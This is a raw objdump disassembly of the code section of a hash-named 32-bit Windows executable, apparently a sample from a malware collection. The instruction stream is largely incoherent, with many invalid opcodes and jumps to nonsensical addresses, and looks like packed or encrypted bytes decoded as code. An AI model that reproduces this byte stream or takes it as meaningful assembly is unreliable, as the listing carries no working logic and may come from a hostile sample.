
be8daf70ae6631f7a3a6c01eeaad5366369f0a5d8277f2a9e0f568ac807a8c00.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	call   0x8d6880
  401009:	add    BYTE PTR [eax],al
  40100b:	add    BYTE PTR [edx],al
  40100d:	add    BYTE PTR [eax],al
  40100f:	add    BYTE PTR [ebp+0x0],cl
  401012:	add    BYTE PTR [eax],al
  401014:	add    al,ah
  401016:	add    BYTE PTR [eax],al
  401018:	add    BYTE PTR [esi+0x554d0000],ah
  40101e:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  401024:	mov    esp,ebp
  401026:	or     ah,dh
  401028:	dec    ebp
  401029:	add    bh,al
  40102b:	add    BYTE PTR [eax],cl
  40102d:	add    BYTE PTR [eax],al
  40102f:	mov    DWORD PTR [eax],0x40f44545
  401035:	cmp    BYTE PTR [eax],al
  401037:	test   DWORD PTR [ebx-0x34070b64],ecx
  40103d:	(bad)  
  40103e:	enter  0x4d45,0xbc
  401042:	mov    edi,DWORD PTR [ebx]
  401044:	hlt    
  401045:	test   ebx,ecx
  401047:	pushf  
  401048:	enter  0x4df8,0x8b
  40104c:	mov    DWORD PTR [ebp-0x20],0x890208
  401053:	inc    ebp
  401054:	inc    ebp
  401055:	cld    
  401056:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40105c:	or     BYTE PTR [ebx+0x0],dl
  40105f:	mov    ebx,0x8bd5900
  401064:	call   DWORD PTR [ecx-0x1]
  401067:	pop    es
  401068:	mov    ch,0x33
  40106a:	dec    ebx
  40106c:	(bad)  
  40106d:	mov    eax,0x72009fa4
  401072:	push   DWORD PTR [edx]
  401074:	or     BYTE PTR [eax],al
  401076:	jmp    0xff89:0x75c84d03
  40107d:	dec    ebp
  40107e:	loopne 0x401050
  401080:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  401086:	add    BYTE PTR [ebx],dh
  401088:	mov    ecx,ebx
  40108a:	hlt    
  40108b:	add    ecx,ebx
  40108d:	enter  0x899f,0x32
  401091:	dec    ebp
  401092:	add    ecx,eax
  401094:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40109a:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4010a1:	xor    ecx,ebx
  4010a3:	retf   
  4010a4:	enter  0x4d03,0xc8
  4010a8:	mov    DWORD PTR fs:[eax],ebx
  4010ab:	lea    eax,[eax]
  4010ad:	push   esp
  4010ae:	mov    edi,edi
  4010b0:	fs (bad) 
  4010b2:	(bad)  
  4010b3:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4010b9:	push   0xffffffff
  4010bb:	and    bh,bh
  4010bd:	pop    ecx
  4010be:	inc    eax
  4010bf:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4010c5:	push   0xffffff8b
  4010c7:	pop    ecx
  4010c8:	cld    
  4010c9:	dec    ebp
  4010ca:	lea    ecx,[ecx+0x45ff08ff]
  4010d0:	mov    BYTE PTR [edx+0x1],cl
  4010d3:	add    BYTE PTR [eax],al
  4010d5:	mov    DWORD PTR [ebp+0x8],0x58008d
  4010dc:	dec    DWORD PTR [ebp-0x77]
  4010df:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4010e6:	cld    
  4010e7:	dec    ebp
  4010e8:	jne    0x40111d
  4010ea:	lea    eax,[ebx]
  4010ec:	push   eax
  4010ed:	mov    edi,edi
  4010ef:	or     BYTE PTR [ecx+0x54a845],cl
  4010f5:	add    al,ch
  4010f7:	(bad)  
  4010f8:	sub    ebp,esp
  4010fa:	add    BYTE PTR [eax],al
  4010fc:	rol    BYTE PTR [eax],0x84
  4010ff:	inc    ebp
  401100:	add    dh,BYTE PTR [esi+0x0]
  401103:	add    BYTE PTR [ebp-0x73],al
  401106:	mov    ebp,DWORD PTR [esp+edx*4]
  401109:	inc    DWORD PTR [eax]
  40110b:	lea    ecx,[ebx-0x30074f4]
  401111:	call   0x411c96
  401116:	add    BYTE PTR [ebp+0x0],cl
  401119:	jne    0x40115c
  40111b:	dec    DWORD PTR [ebx-0x76210314]
  401121:	dec    ebp
  401122:	add    DWORD PTR [ebp+0x0],esi
  401125:	(bad)  
  401126:	xchg   ebp,eax
  401127:	loopne 0x401128
  401129:	inc    eax
  40112a:	inc    DWORD PTR [eax]
  40112c:	mov    ecx,DWORD PTR [ebp-0x4]
  40112f:	xor    edx,DWORD PTR [edx+0x7201b8]
  401135:	add    BYTE PTR [edx],dl
  401137:	enter  0x4d90,0x0
  40113b:	mov    eax,DWORD PTR [eax]
  40113d:	hlt    
  40113e:	add    al,0xa5
  401140:	mov    al,0xff
  401142:	add    bh,bh
  401144:	add    BYTE PTR [ebx],dh
  401146:	inc    DWORD PTR [ebx]
  401148:	sbb    al,0x89
  40114a:	jne    0x401124
  40114c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  401152:	mov    eax,DWORD PTR [ebp-0xff0048]
  401158:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40115f:	inc    DWORD PTR [ebp-0x75]
  401162:	fisttp QWORD PTR [esi+ebp*8]
  401165:	test   DWORD PTR [esi-0x1],esp
  401168:	inc    ebp
  401169:	(bad)  
  40116a:	aas    
  40116b:	inc    ebp
  40116c:	(bad)  
  40116d:	lea    edi,[esp+eiz*2-0x1]
  401171:	push   DWORD PTR [edi]
  401173:	mov    DWORD PTR ds:0x8000c7a0,edi
  401179:	mov    ebp,esp
  40117b:	cld    
  40117c:	jmp    0xdfff:0xeeff458d
  401183:	mov    bh,al
  401185:	add    DWORD PTR [eax-0x13ba1500],ecx
  40118b:	inc    DWORD PTR [ebp-0x4]
  40118e:	xlat   BYTE PTR ds:[ebx]
  40118f:	lea    edi,[edi]
  401191:	inc    edi
  401193:	jmp    FWORD PTR [eax-0x78]
  401196:	inc    DWORD PTR [ecx]
  401198:	aaa    
  401199:	add    BYTE PTR ds:0x6c00c757,bh
  40119f:	test   edi,edi
  4011a1:	pandn  mm0,mm5
  4011a4:	aas    
  4011a5:	add    bh,al
  4011a7:	mov    esi,DWORD PTR [eax-0x4]
  4011aa:	inc    DWORD PTR [eax+0xdf01ee]
  4011b0:	(bad)  
  4011b1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4011b5:	mov    esp,ebx
  4011b7:	xchg   esp,eax
  4011b8:	rol    DWORD PTR [eax],cl
  4011ba:	(bad)  
  4011bb:	mov    edi,DWORD PTR [eax+0x3]
  4011be:	(bad)  
  4011bf:	cmp    al,0xd7
  4011c1:	dec    ebp
  4011c2:	ror    DWORD PTR [ebx+0x2ad8e8],0x0
  4011c9:	lea    ecx,[ebx-0x7f0003b4]
  4011cf:	push   edx
  4011d0:	add    DWORD PTR [ebp+0x0],edx
  4011d3:	mov    esi,DWORD PTR [eax]
  4011d5:	mov    WORD PTR [edx+0x0],gs
  4011d8:	add    BYTE PTR [ebx-0x778afc7b],cl
  4011de:	mov    eax,DWORD PTR [eax]
  4011e0:	cld    
  4011e1:	push   0x7d
  4011e3:	dec    DWORD PTR [ebx+0xd88c]
  4011e9:	push   edx
  4011ea:	mov    edx,DWORD PTR [ecx-0x4]
  4011ed:	call   DWORD PTR [eax+0x7d01fc]
  4011f3:	mov    ecx,DWORD PTR [ecx+0x509000fc]
  4011f9:	add    DWORD PTR [esi+0x0],edx
  4011fc:	test   DWORD PTR [ebp+0x75],eax
  4011ff:	jmp    0x947d:0xc7fce28b
  401206:	mov    ebp,ebx
  401208:	fcom   st(7)
  40120a:	add    bh,al
  40120c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  401212:	add    edi,edi
  401214:	add    bh,bh
  401216:	addr16 in eax,dx
  401218:	add    dh,dl
  40121a:	push   eax
  40121b:	inc    ebp
  40121c:	push   esi
  40121d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  401223:	test   BYTE PTR [ebx],dh
  401225:	(bad)  
  401226:	add    eax,0x4572c8
  40122b:	jecxz  0x4011ee
  40122d:	rol    DWORD PTR [edi+eax*8-0x22ff73ff],cl
  401234:	inc    esi
  401235:	jle    0x401237
  401237:	test   edi,eax
  401239:	jmp    esp
  40123b:	inc    DWORD PTR [eax]
  40123d:	in     eax,dx
  40123e:	add    dh,dl
  401240:	jne    0x4011c7
  401242:	mov    edi,edi
  401244:	cld    
  401245:	inc    DWORD PTR [ebp-0x14]
  401248:	mov    ebp,edx
  40124a:	mov    ah,0x85
  40124c:	add    bh,bh
  40124e:	call   0x1163d52
  401253:	enter  0x858b,0xfc
  401257:	inc    DWORD PTR [eax+0xeb01ff]
  40125d:	in     al,dx
  40125e:	xor    BYTE PTR [ebp-0xff0020],al
  401264:	mov    ebx,ebp
  401266:	cld    
  401267:	jle    0x4011f2
  401269:	mov    eax,0x50000001
  40126e:	add    DWORD PTR [ebp+0x45],eax
  401271:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  401277:	dec    DWORD PTR [ebx-0x3fd80318]
  40127d:	add    BYTE PTR [ebp-0xbf0040],dl
  401283:	inc    ebp
  401284:	das    
  401285:	mov    eax,DWORD PTR [eax]
  401287:	cld    
  401288:	push   eax
  401289:	mov    al,0x45
  40128b:	add    DWORD PTR [ebx+0x459c00],ecx
  401291:	mov    edi,edi
  401293:	mov    eax,0xe80800ff
  401298:	inc    ebp
  401299:	sub    cl,BYTE PTR [ebx-0x47000400]
  40129f:	add    al,0x1
  4012a1:	rol    BYTE PTR [eax],0x1e
  4012a4:	jne    0x4012eb
  4012a6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4012ac:	inc    DWORD PTR [ecx]
  4012ae:	call   0x853cb3
  4012b3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4012b9:	call   0x403cbf
  4012be:	xor    bh,bh
  4012c0:	push   edi
  4012c1:	adc    BYTE PTR [ebx-0x747423bb],al
  4012c7:	loopne 0x4012a5
  4012c9:	ret    
  4012ca:	loopne 0x40126b
  4012cc:	xor    DWORD PTR [edx],0x31
  4012cf:	cmp    edi,edi
  4012d1:	bswap  esp
  4012d3:	rol    BYTE PTR gs:[eax],0x5
  4012d7:	jmp    0x12b1421
  4012dc:	mov    eax,DWORD PTR [ebp-0x4]
  4012df:	add    BYTE PTR [eax+0xff0100],bh
  4012e5:	cld    
  4012e6:	jne    0x401365
  4012e8:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4012ee:	lds    eax,FWORD PTR [ecx]
  4012f0:	add    BYTE PTR [eax],al
  4012f2:	push   eax
  4012f3:	cs inc ebp
  4012f5:	add    BYTE PTR [ebx+0x459850],cl
  4012fb:	mov    edi,edi
  4012fd:	test   al,0xff
  4012ff:	add    BYTE PTR [eax],cl
  401301:	inc    DWORD PTR [ebp-0x18]
  401304:	jmp    DWORD PTR [esi]
  401306:	fadd   QWORD PTR [eax]
  401308:	jge    0x401357
  40130a:	adc    BYTE PTR [ebx+0x459cb9],cl
  401310:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  401316:	lahf   
  401317:	mov    eax,0x30132
  40131c:	lea    esi,[ebp+0x2c]
  40131f:	xor    edi,edi
  401321:	(bad)  
  401322:	call   0x13f3c8f
  401327:	call   0x1343db7
  40132c:	jne    0x4012b9
  40132e:	xor    edi,esp
  401330:	add    eax,DWORD PTR [eax+0xc018d]
  401336:	push   DWORD PTR [eax]
  401338:	call   0xc93c94
  40133d:	int3   
  40133e:	inc    DWORD PTR [ebp-0x14]
  401341:	mov    ecx,DWORD PTR [ebp-0x28]
  401344:	xor    eax,DWORD PTR [eax]
  401346:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40134c:	(bad)  
  40134d:	xchg   ebp,eax
  40134e:	in     al,0xff
  401350:	add    bh,bh
  401352:	add    BYTE PTR [eax*2+0x8508b00],al
  401359:	inc    ebp
  40135a:	ret    
  40135b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff61]
  401362:	mov    edi,edi
  401364:	or     BYTE PTR [eax],cl
  401366:	inc    ebp
  401367:	test   DWORD PTR gs:[eax],eax
  40136a:	je     0x4013b1
  40136c:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  401372:	xor    edx,DWORD PTR [eax-0x73]
  401375:	push   ebp
  401376:	or     BYTE PTR [ebp+0x21007572],al
  40137c:	inc    ebp
  40137d:	in     al,dx
  40137e:	mov    ebp,DWORD PTR [eax]
  401380:	mov    esp,0x618bc345
  401385:	fmul   st,st(5)
  401387:	add    BYTE PTR [ebx],ch
  401389:	mov    eax,DWORD PTR [ebx]
  40138b:	cld    
  40138c:	loopne 0x40134e
  40138e:	inc    ebp
  40138f:	push   ebp
  401390:	cmp    ebp,eax
  401392:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  401399:	cld    
  40139a:	fadd   DWORD PTR [eax+0x3b014d]
  4013a0:	jne    0x4013d2
  4013a2:	push   0xf8898557
  4013a7:	in     al,dx
  4013a8:	jne    0x4013ef
  4013aa:	lea    eax,[ebx+0x72e8dcc8]
  4013b0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4013b6:	jmp    0x4013eb
  4013b8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4013be:	xor    eax,edi
  4013c0:	adc    DWORD PTR [ebp-0xcd0061],0x8b9031
  4013ca:	rcl    BYTE PTR [eax-0x40],1
  4013cd:	inc    ebp
  4013ce:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4013d6:	inc    ebp
  4013d7:	xchg   ebp,eax
  4013d8:	ud0    ebp,DWORD PTR [ebx]
  4013db:	inc    DWORD PTR [eax]
  4013dd:	jp     0x401455
  4013df:	add    BYTE PTR [edx+0x1f558050],cl
  4013e5:	mov    ecx,DWORD PTR [esp+esi*8]
  4013e8:	inc    eax
  4013e9:	retf   
  4013ea:	inc    ebp
  4013eb:	iret   
  4013ec:	jb     0x4013b6
  4013ee:	mov    eax,DWORD PTR [edi]
  4013f0:	enter  0x4545,0x1
  4013f4:	cmp    BYTE PTR [eax],al
  4013f6:	pushf  
  4013f7:	mov    ecx,DWORD PTR [ecx+0x3b4df0bc]
  4013fd:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  401404:	dec    ebp
  401405:	add    BYTE PTR [ebx],dh
  401407:	inc    ebp
  401408:	mov    DWORD PTR [ebx-0x3f601b4c],ecx
  40140e:	xor    dl,BYTE PTR [edx]
  401410:	add    eax,DWORD PTR [ebp-0x77]
  401413:	mov    eax,esp
  401415:	fmul   DWORD PTR [ebp-0x3d]
  401418:	xor    eax,DWORD PTR [ebx+eax*1+0x832899f]
  40141f:	mov    DWORD PTR [ebp-0x28],eax
  401422:	fadd   DWORD PTR [ebp-0x64]
  401425:	xor    eax,edi
  401427:	mov    ecx,0xff858db0
  40142c:	clc    
  40142d:	enter  0x4d45,0x3d
  401431:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  401438:	test   esi,edi
  40143a:	clc    
  40143b:	inc    DWORD PTR [ebp+0x45]
  40143e:	aas    
  40143f:	mov    ebx,DWORD PTR [eax+ecx*1+0x16a8c8c7]
  401446:	test   DWORD PTR [eax],edi
  401448:	clc    
  401449:	pushf  
  40144a:	inc    ebp
  40144b:	push   DWORD PTR [ecx]
  40144d:	cld    
  40144e:	pushf  
  40144f:	inc    ebp
  401450:	mov    edx,DWORD PTR [eax-0x28]
  401453:	ins    DWORD PTR es:[edi],dx
  401454:	push   ebp
  401455:	add    BYTE PTR [ebx],dh
  401457:	mov    DWORD PTR [ebx],eax
  401459:	sar    BYTE PTR [ebx],1
  40145b:	adc    BYTE PTR [edi],cl
  40145d:	dec    ebp
  40145e:	adc    al,0x8b
  401460:	add    al,dl
  401462:	jmp    0x1011632
  401467:	jb     0x4014b6
  401469:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40146f:	xor    ecx,DWORD PTR [ebp+0x3b]
  401472:	xor    ecx,DWORD PTR [edi]
  401474:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  401478:	(bad)  
  40147a:	clc    
  40147b:	enter  0x8400,0x8b
  40147f:	pop    es
  401480:	mov    al,0x0
  401482:	push   ebp
  401483:	push   cs
  401484:	xor    ecx,eax
  401486:	xor    esp,ecx
  401488:	add    ebp,DWORD PTR [eax]
  40148a:	add    esi,DWORD PTR [eax]
  40148c:	(bad)  
  40148e:	retf   0x55c8
  401491:	repnz mov eax,DWORD PTR [ebp-0x10]
  401495:	(bad)  
  401496:	cli    
  401497:	fdivr  st,st(1)
  401499:	test   DWORD PTR [eax+edi*8],ecx
  40149c:	dec    ebp
  40149d:	inc    ebp
  40149e:	xor    edi,DWORD PTR [eax-0x7167afd]
  4014a4:	add    BYTE PTR [ebp+0x0],al
  4014a7:	mov    ecx,DWORD PTR [ebp-0x28]
  4014aa:	mov    ecx,ebx
  4014ac:	clc    
  4014ad:	jne    0x40147a
  4014af:	mov    esi,0xd672d3
  4014b4:	into   
  4014b5:	into   
  4014b6:	scas   eax,DWORD PTR es:[edi]
  4014b7:	dec    ebp
  4014b8:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4014be:	sub    ecx,esi
  4014c0:	cmp    ecx,DWORD PTR [ebp+0x77]
  4014c3:	(bad)  
  4014c4:	mov    edi,eax
  4014c6:	mov    al,0x85
  4014c8:	mov    eax,edi
  4014ca:	add    BYTE PTR [ebp-0x75],al
  4014cd:	cmp    ah,BYTE PTR [esp+ebx*4-0x47cc38ab]
  4014d4:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4014da:	(bad)  
  4014dc:	retf   0x559c
  4014df:	(bad)  
  4014e0:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4014e7:	inc    ebp
  4014e8:	add    eax,0xeb9c4d3e
  4014ed:	(bad)  
  4014ee:	mov    ecx,esp
  4014f0:	lods   al,BYTE PTR ds:[esi]
  4014f1:	test   DWORD PTR [ebp-0x8],edx
  4014f4:	xor    ecx,DWORD PTR [ebp+0x33]
  4014f7:	mov    eax,DWORD PTR [ebx]
  4014f9:	lock add ecx,ebx
  4014fc:	bswap  esi
  4014fe:	retf   0x55d1
  401501:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  401507:	jmp    0x401502
  401509:	add    BYTE PTR ds:0xebc44d8b,al
  40150f:	push   ebp
  401510:	mov    ebp,DWORD PTR [ebx]
  401512:	test   al,0x8b
  401514:	push   ebp
  401515:	clc    
  401516:	xor    ecx,ebx
  401518:	xor    ecx,esi
  40151a:	add    edx,ecx
  40151c:	add    eax,DWORD PTR [edx+0xca010f]
  401522:	push   ebp
  401523:	dec    ebp
  401524:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40152a:	stc    
  40152b:	rol    DWORD PTR ds:0xebce4dd6,cl
  401531:	scas   eax,DWORD PTR es:[edi]
  401532:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  401538:	xor    ebp,DWORD PTR [ebx]
  40153a:	xor    edi,DWORD PTR [ebx]
  40153c:	add    esi,DWORD PTR [edi+0x3]
  40153f:	mov    ecx,DWORD PTR [edi]
  401541:	clc    
  401542:	retf   0x55cb
  401545:	into   
  401546:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40154d:	mov    eax,0x3376554d
  401552:	mov    esi,DWORD PTR [ebx]
  401554:	int3   
  401555:	add    edx,DWORD PTR [ebp+0x3]
  401558:	xor    ecx,DWORD PTR [edi]
  40155a:	xor    ecx,edx
  40155c:	add    edx,DWORD PTR [ebp+0x3]
  40155f:	mov    ecx,DWORD PTR [edi]
  401561:	lock retf 0x4dfa
  401565:	stc    
  401566:	mov    ecx,DWORD PTR [eax]
  401568:	or     BYTE PTR [ebp+0x4d],cl
  40156b:	jmp    0x10415fb
  401570:	dec    ebp
  401571:	dec    ebp
  401572:	(bad)  
  401573:	mov    ebx,esp
  401575:	clc    
  401576:	test   ebx,ecx
  401578:	clc    
  401579:	ror    DWORD PTR [ebp-0x2a],cl
  40157c:	mov    esi,ecx
  40157e:	call   0x3acb5b32
  401583:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40158a:	retf   
  40158b:	ja     0x40155b
  40158d:	mov    ebp,DWORD PTR [eax-0x48]
  401590:	dec    ebp
  401591:	xor    ecx,DWORD PTR [di+0x3]
  401595:	mov    esp,esp
  401597:	clc    
  401598:	push   ebp
  401599:	retf   
  40159a:	mov    dl,bl
  40159c:	adc    esi,edx
  40159e:	jb     0x40156e
  4015a0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4015a6:	call   0x4d6be128
  4015ab:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  4015b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015b2:	lahf   
  4015b3:	inc    ebp
  4015b4:	xor    cl,BYTE PTR [ebp-0x78]
  4015b7:	mov    edx,edi
  4015b9:	clc    
  4015ba:	dec    ebp
  4015bb:	retf   
  4015bc:	mov    edx,ebx
  4015be:	call   0x560ee999
  4015c3:	scas   eax,DWORD PTR es:[edi]
  4015c4:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4015ca:	lahf   
  4015cb:	sub    esi,DWORD PTR [edx]
  4015cd:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4015d3:	lods   al,BYTE PTR ds:[esi]
  4015d4:	xor    esp,DWORD PTR [ebx]
  4015d6:	add    ecx,DWORD PTR [ebp-0x1c]
  4015d9:	mov    edi,DWORD PTR [ebp-0x8]
  4015dc:	mov    bl,cl
  4015de:	cmp    dl,bl
  4015e0:	jb     0x4015b0
  4015e2:	add    dh,dl
  4015e4:	dec    ebp
  4015e5:	scas   eax,DWORD PTR es:[edi]
  4015e6:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  4015ec:	shr    DWORD PTR [ebx],cl
  4015ee:	into   
  4015ef:	cmp    edx,esi
  4015f1:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  4015f7:	dec    ebp
  4015f8:	dec    ebp
  4015f9:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  4015ff:	retf   
  401600:	xor    edx,esi
  401602:	add    ecx,esi
  401604:	imul   ecx,edx
  401607:	mov    DWORD PTR [ebp+0x8],edx
  40160a:	xor    ecx,DWORD PTR [ebp+0x2b]
  40160d:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  401613:	add    esi,DWORD PTR [ebx]
  401615:	mov    ah,0x3
  401617:	inc    ebp
  401618:	(bad)  
  40161b:	pushf  
  40161c:	jge    0x4015a7
  40161e:	xor    ebx,eax
  401620:	sub    eax,DWORD PTR [ebp-0x73]
  401623:	(bad)  
  401624:	cmp    al,al
  401626:	jb     0x4015ad
  401628:	add    al,bh
  40162a:	ror    DWORD PTR [ebp-0x7a],1
  40162d:	xor    edi,edi
  40162f:	add    edi,edi
  401631:	jmp    0x401680
  401633:	mov    ecx,DWORD PTR [ebx-0x34341324]
  401639:	dec    ebp
  40163a:	into   
  40163b:	mov    ebp,DWORD PTR [edi-0x23737428]
  401641:	lahf   
  401642:	shl    DWORD PTR [edx],cl
  401644:	retf   0x5588
  401647:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40164d:	add    eax,DWORD PTR [eax]
  40164f:	in     al,0x4d
  401651:	push   ebp
  401652:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  401658:	popa   
  401659:	add    ch,cl
  40165b:	dec    ebp
  40165c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  401662:	dec    ebp
  401663:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  401669:	jge    0x401639
  40166b:	mov    BYTE PTR [edi+0xf723b3a],ch
  401671:	add    cl,dh
  401673:	dec    ebp
  401674:	dec    DWORD PTR [ebx-0x2c032375]
  40167a:	adc    BYTE PTR [ebp+0x1],0x8b
  40167e:	add    al,bl
  401680:	jge    0x40160e
  401682:	push   0xffffff9f
  401684:	push   0x8b3032
  401689:	shl    BYTE PTR [ebp+0x55],0x6a
  40168d:	xor    edi,edi
  40168f:	xor    edx,DWORD PTR [ebx+eax*1]
  401692:	inc    ebp
  401693:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  401699:	dec    ebp
  40169a:	or     BYTE PTR [ecx+0x4dc8e483],cl
  4016a0:	jbe    0x40162d
  4016a2:	mov    ebp,esp
  4016a4:	ror    bl,1
  4016a6:	enter  0x14ce,0xaf
  4016aa:	dec    DWORD PTR [ebx-0x2cef17f8]
  4016b0:	push   ebp
  4016b1:	retf   0x5540
  4016b4:	push   ebp
  4016b5:	mov    esi,DWORD PTR [edx-0x1c]
  4016b8:	mov    edx,ebx
  4016ba:	cld    
  4016bb:	(bad)  
  4016bc:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4016c3:	sti    
  4016c4:	add    dh,cl
  4016c6:	push   0xffffff94
  4016c8:	call   FWORD PTR [edi+0x3b5032d0]
  4016ce:	mov    ecx,DWORD PTR [edi]
  4016d0:	int3   
  4016d1:	pop    esi
  4016d2:	inc    ebp
  4016d3:	dec    DWORD PTR [ecx+0x45e8c88b]
  4016d9:	push   ebp
  4016da:	xor    esi,DWORD PTR [ebx]
  4016dc:	mov    DWORD PTR [ebx],0xcace0f9c
  4016e2:	aas    
  4016e3:	push   ebp
  4016e4:	inc    ebp
  4016e5:	xor    eax,esi
  4016e7:	add    eax,esi
  4016e9:	mov    eax,DWORD PTR [ebx]
  4016eb:	(bad)  
  4016ec:	jmp    0x40167a
  4016ee:	mov    bl,BYTE PTR [edi-0x7674cdfb]
  4016f4:	rol    ah,1
  4016f6:	mov    esi,0xf133104d
  4016fb:	mov    edx,0xff348d80
  401700:	mov    dh,0xd1
  401702:	cmp    edx,DWORD PTR [ebp+0xf]
  401705:	mov    eax,DWORD PTR [edx-0x20]
  401708:	add    BYTE PTR [ebp-0x75],bh
  40170b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  401712:	lahf   
  401713:	retf   0x8632
  401716:	cmp    ebp,0x8
  401719:	call   ebx
  40171b:	inc    ebp
  40171c:	inc    ebp
  40171d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  401723:	mov    edi,DWORD PTR [eax]
  401725:	enter  0x49c,0xc7
  401729:	add    al,al
  40172b:	add    bl,al
  40172d:	(bad)  
  40172e:	clc    
  40172f:	enter  0x45,0x38
  401733:	push   eax
  401734:	pushf  
  401735:	mov    edi,eax
  401737:	int3   
  401738:	or     al,al
  40173a:	test   DWORD PTR [edi],edi
  40173c:	clc    
  40173d:	gs inc ebp
  40173f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  401745:	push   ss
  401746:	xor    ecx,DWORD PTR [ebp+0x3]
  401749:	sub    edx,DWORD PTR [ecx-0x76]
  40174c:	dec    ebp
  40174d:	add    DWORD PTR [ebx+0x88d845],ecx
  401753:	mov    esi,DWORD PTR [ebx]
  401755:	or     BYTE PTR [ebx],al
  401757:	cmp    edx,DWORD PTR [ecx-0x38]
  40175a:	dec    ebp
  40175b:	out    dx,eax
  40175c:	xor    eax,DWORD PTR [ebp+0x3]
  40175f:	mov    edx,DWORD PTR [ecx-0x28]
  401762:	dec    ebp
  401763:	add    BYTE PTR [ebx],dh
  401765:	push   0x518003
  40176a:	push   eax
  40176b:	add    BYTE PTR [ebx-0x300748b],cl
  401771:	sbb    BYTE PTR [ebp+0x45],cl
  401774:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40177a:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  401780:	dec    ebp
  401781:	inc    ebp
  401782:	xor    eax,esi
  401784:	add    eax,esi
  401786:	push   ecx
  401787:	(bad)  
  401788:	dec    ebp
  401789:	mov    al,ds:0x35e03dff
  40178e:	retf   
  40178f:	(bad)  
  401790:	into   
  401791:	sub    bh,bh
  401793:	dec    esp
  401794:	adc    al,0x9c
  401796:	inc    ebp
  401797:	push   ebp
  401798:	test   DWORD PTR [edi],ecx
  40179a:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab5ff80]
  4017a1:	jmp    0xc9b926b5
  4017a6:	add    cl,dl
  4017a8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4017b2:	cmp    cl,BYTE PTR [ebp+0x728b089c]
  4017b8:	rol    BYTE PTR [eax],0x59
  4017bb:	clc    
  4017bc:	popa   
  4017bd:	jb     0x4017c6
  4017bf:	mov    eax,DWORD PTR [ebp-0x30]
  4017c2:	xor    al,0x40
  4017c4:	sub    al,0xc7
  4017c6:	mov    ah,ch
  4017c8:	add    DWORD PTR [ebp+0x4534f845],eax
  4017ce:	sub    al,0x89
  4017d0:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  4017d7:	mov    ch,0xff
  4017d9:	clc    
  4017da:	add    DWORD PTR [ebp+0x60],0x3c
  4017de:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  4017e5:	inc    ebp
  4017e6:	dec    DWORD PTR [ebx-0x341ff701]
  4017ec:	test   esi,ecx
  4017ee:	dec    DWORD PTR [ebx-0x7f8a3301]
  4017f4:	push   eax
  4017f5:	add    DWORD PTR [ebp+0x0],eax
  4017f8:	dec    ebx
  4017fa:	or     al,0xce
  4017fc:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  401803:	into   
  401804:	add    BYTE PTR [ebx-0x34ff1400],cl
  40180a:	mov    esi,ecx
  40180c:	sar    bh,0x45
  40180f:	adc    al,0x8b
  401811:	clc    
  401812:	fadd   DWORD PTR [ebp+0x0]
  401815:	mov    ebp,DWORD PTR [edx+0x8]
  401818:	push   edi
  401819:	adc    BYTE PTR [eax+0x1],0x83
  40181d:	add    al,al
  40181f:	retf   
  401820:	mov    ecx,esi
  401822:	cld    
  401823:	mov    eax,DWORD PTR [eax+0xcb01cc]
